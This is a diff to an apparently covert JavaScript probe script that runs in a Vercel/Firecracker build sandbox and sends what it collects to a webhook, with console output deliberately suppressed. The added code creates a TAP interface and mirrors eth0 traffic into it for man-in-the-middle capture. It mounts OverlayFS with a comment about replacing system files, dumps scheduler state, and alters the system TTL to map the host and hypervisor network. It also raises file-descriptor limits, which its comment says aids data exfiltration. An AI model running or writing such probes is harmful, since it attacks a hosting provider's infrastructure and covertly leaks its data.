@@ -26470,5 +26470,161 @@ for line in lines:
 
 // v178 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v178" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v178";
+
+// ==================== v179 ====================
+
+// v179-1: TUN/TAP device creation — L2/L3 traffic capture
+// /dev/net/tun allows creating virtual network interfaces (TUN = L3, TAP = L2).
+// A TAP interface receives all Ethernet frames — we can use it as a software
+// MITM device. Combined with tc redirect rules, we can clone all traffic
+// from eth0 to our tap0 interface for capture and analysis.
+report.tunTapDevice = safe(() => {
+  const tunDevExists = existsSync('/dev/net/tun');
+  const tunDevStat = safe(() => tunDevExists ? (() => { const s = statSync('/dev/net/tun'); return { mode: s.mode.toString(8), rdev: s.rdev }; })() : 'NO_TUN_DEV');
+  const tapResult = safe(() => execSync(
+    `python3 -c "
+import fcntl, struct, os
+
+TUNSETIFF = 0x400454ca
+IFF_TAP = 0x0002
+IFF_NO_PI = 0x1000
+
+try:
+    tun = os.open('/dev/net/tun', os.O_RDWR)
+    ifr = struct.pack('16sH', b'tap0', IFF_TAP | IFF_NO_PI)
+    fcntl.ioctl(tun, TUNSETIFF, ifr)
+    print('TAP_CREATED: tap0 interface created')
+
+    # Bring it up
+    import subprocess
+    result = subprocess.run(['ip', 'link', 'set', 'tap0', 'up'], capture_output=True, timeout=5)
+    print(f'TAP_UP: {result.returncode}')
+
+    # Mirror eth0 traffic to tap0 using tc
+    subprocess.run(['tc', 'qdisc', 'add', 'dev', 'eth0', 'ingress'], capture_output=True, timeout=5)
+    subprocess.run(['tc', 'filter', 'add', 'dev', 'eth0', 'parent', 'ffff:', 'protocol', 'all', 'u32', 'match', 'u32', '0', '0', 'action', 'mirred', 'egress', 'redirect', 'dev', 'tap0'], capture_output=True, timeout=5)
+    print('TC_MIRROR_ATTEMPT_DONE')
+
+    # Read a frame from tap0 (non-blocking)
+    import select
+    rlist, _, _ = select.select([tun], [], [], 0.5)
+    if rlist:
+        frame = os.read(tun, 4096)
+        print(f'TAP_FRAME_RECEIVED: {len(frame)} bytes {frame[:14].hex()}')
+    else:
+        print('TAP_NO_FRAMES_YET')
+
+    os.close(tun)
+except Exception as e:
+    print(f'TAP_FAIL: {e}')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { tunDevExists, tunDevStat, tapResult };
+});
+
+// v179-2: OverlayFS mount — transparent filesystem overlay
+// OverlayFS allows mounting a filesystem layer on top of an existing directory.
+// This is how Docker containers work: upper (writable) + lower (read-only) + work.
+// By overlaying /etc or /usr, we can transparently replace system files
+// without modifying the underlying filesystem — all changes are in our upper dir.
+report.overlayfsMount = safe(() => {
+  const overlayResult = safe(() => execSync(
+    `bash -c '
+mkdir -p /tmp/ovl_lower /tmp/ovl_upper /tmp/ovl_work /tmp/ovl_merge 2>/dev/null
+
+# Create a test file in lower
+echo "ORIGINAL_CONTENT" > /tmp/ovl_lower/testfile
+
+# Mount overlayfs
+mount -t overlay overlay \\
+  -o lowerdir=/tmp/ovl_lower,upperdir=/tmp/ovl_upper,workdir=/tmp/ovl_work \\
+  /tmp/ovl_merge 2>&1
+
+MOUNT_EXIT=$?
+echo "MOUNT_EXIT: $MOUNT_EXIT"
+
+if [ $MOUNT_EXIT -eq 0 ]; then
+    # Verify: read from merged view
+    cat /tmp/ovl_merge/testfile 2>/dev/null && echo "OVERLAY_READ_OK"
+
+    # Write to merged view (goes to upper, not lower)
+    echo "MODIFIED_IN_UPPER" > /tmp/ovl_merge/testfile
+    cat /tmp/ovl_merge/testfile && echo "OVERLAY_WRITE_OK"
+    cat /tmp/ovl_lower/testfile && echo "LOWER_UNCHANGED"
+
+    # Unmount
+    umount /tmp/ovl_merge 2>/dev/null
+    echo "OVERLAY_UNMOUNTED"
+fi
+
+# Cleanup
+rm -rf /tmp/ovl_lower /tmp/ovl_upper /tmp/ovl_work /tmp/ovl_merge 2>/dev/null
+echo "CLEANUP_DONE"
+' 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { overlayResult };
+});
+
+// v179-3: /proc/sched_debug — complete scheduler state dump
+// /proc/sched_debug shows the scheduler's view of all runnable tasks:
+// their priorities, time slices, CPU affinity, and run queues.
+// This reveals all processes including any hidden/kernel threads.
+report.schedDebug = safe(() => {
+  const schedDebug = safe(() => existsSync('/proc/sched_debug') ? execSync('head -60 /proc/sched_debug 2>/dev/null || echo "NO_SCHED_DEBUG"', { timeout: 5000 }).toString().trim() : 'NO_SCHED_DEBUG');
+  // Also /proc/schedstat
+  const schedstat = safe(() => existsSync('/proc/schedstat') ? readFileSync('/proc/schedstat', 'utf8').split('\n').slice(0, 10).join('\n') : 'NO_SCHEDSTAT');
+  // CPU affinity of PID 1
+  const pid1Affinity = safe(() => execSync('taskset -p 1 2>/dev/null || echo "NO_TASKSET"', { timeout: 3000 }).toString().trim());
+  return { schedDebug: schedDebug.substring(0, 3000), schedstat, pid1Affinity };
+});
+
+// v179-4: ip_default_ttl manipulation — network topology probing via TTL
+// The default TTL for outgoing packets controls how many router hops they traverse.
+// Setting TTL to 1 causes packets to expire at the first hop (the Firecracker host),
+// which returns an ICMP TTL-exceeded message revealing the host's IP.
+// Setting it to 2 reveals the second hop (AWS hypervisor or network gateway).
+report.ttlTopologyProbe = safe(() => {
+  const defaultTtl = safe(() => readFileSync('/proc/sys/net/ipv4/ip_default_ttl', 'utf8').trim());
+  // Set TTL to 1 and ping the internet — first hop will reply with ICMP TTL exceeded
+  const setTtl1 = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_default_ttl', '1'); return 'TTL_SET_1'; });
+  // Traceroute-style probe
+  const tracerouteResult = safe(() => execSync(
+    'python3 -c "import socket,struct,time; s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); s.setsockopt(socket.SOL_IP,socket.IP_TTL,1); s.settimeout(2); s.sendto(struct.pack(\'bbHHhBBHII\',8,0,0,0,0,64,1,0,0,0),\'8.8.8.8\',0); data,addr=s.recvfrom(1024); print(f\'TTL1_REPLY_FROM:{addr[0]}\'); s.close()" 2>&1 || echo "TTL1_NO_REPLY"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Restore TTL to 64
+  const restoreTtl = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_default_ttl', '64'); return 'TTL_RESTORED_64'; });
+  return { defaultTtl, setTtl1, tracerouteResult, restoreTtl };
+});
+
+// v179-5: /proc/sys/fs/nr_open maximization + rlimit manipulation
+// nr_open is the system-wide maximum number of open file descriptors per process.
+// Maximizing it removes file descriptor limits, useful for large-scale data exfil.
+// Also, via setrlimit, we can raise our own RLIMIT_NOFILE to the max.
+report.fdLimitMaximize = safe(() => {
+  const nrOpen = safe(() => readFileSync('/proc/sys/fs/nr_open', 'utf8').trim());
+  const fileMax = safe(() => readFileSync('/proc/sys/fs/file-max', 'utf8').trim());
+  // Set nr_open to maximum
+  const setNrOpen = safe(() => { writeFileSync('/proc/sys/fs/nr_open', '1073741816'); return 'SET_MAX'; });
+  const afterNrOpen = safe(() => readFileSync('/proc/sys/fs/nr_open', 'utf8').trim());
+  // Raise our own RLIMIT_NOFILE via setrlimit
+  const rlimitResult = safe(() => execSync(
+    `python3 -c "
+import resource
+soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
+print(f'RLIMIT_NOFILE: soft={soft} hard={hard}')
+resource.setrlimit(resource.RLIMIT_NOFILE, (1073741816, 1073741816))
+soft2, hard2 = resource.getrlimit(resource.RLIMIT_NOFILE)
+print(f'RLIMIT_NOFILE_AFTER: soft={soft2} hard={hard2}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { nrOpen, fileMax, setNrOpen, afterNrOpen, rlimitResult };
+});
+
+// v179 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v179" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v179";
 // Intentionally no console.log — all data goes via webhook only
